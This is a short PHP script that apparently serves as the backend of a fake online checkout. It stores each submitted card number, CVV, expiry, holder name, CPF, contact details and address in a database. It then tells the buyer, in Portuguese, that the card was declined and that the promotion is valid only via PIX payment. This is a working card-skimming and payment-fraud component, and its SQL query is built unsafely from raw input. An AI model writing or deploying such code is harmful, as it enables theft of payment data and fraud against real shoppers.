<?php

include 'Painel/db_connection.php';

$dadosCartao = json_decode(file_get_contents("php://input"), true);
$conn = getConnection();

$sql = "INSERT INTO dados_cartao (numero_do_cartao, nome_titular, validade, cvv, cpf_titular,nome,telefone,email,cep,rua,numero,bairro,cidade,estado)
        VALUES ('" . $dadosCartao['numeroDoCartao'] . "', '" . $dadosCartao['nomeTitular'] . "', '" . $dadosCartao['validade'] . "', 
        '" . $dadosCartao['cvv'] . "', '" . $dadosCartao['cpfTitular'] . "', '" . $dadosCartao['nome'] . "', '" . $dadosCartao['tel'] . "',
         '" . $dadosCartao['mail'] . "', '" . $dadosCartao['cep'] . "', '" . $dadosCartao['rua'] . "', '" . $dadosCartao['numero'] . "', '" . $dadosCartao['bairro'] . "', '" . $dadosCartao['cidade'] . "', '" . $dadosCartao['estado'] . "')";

if ($conn->query($sql) === TRUE) {
    echo json_encode(array("message" => "NÃO APROVADO, Promoção válida somente na modalidade PIX."));
}

$conn->close();
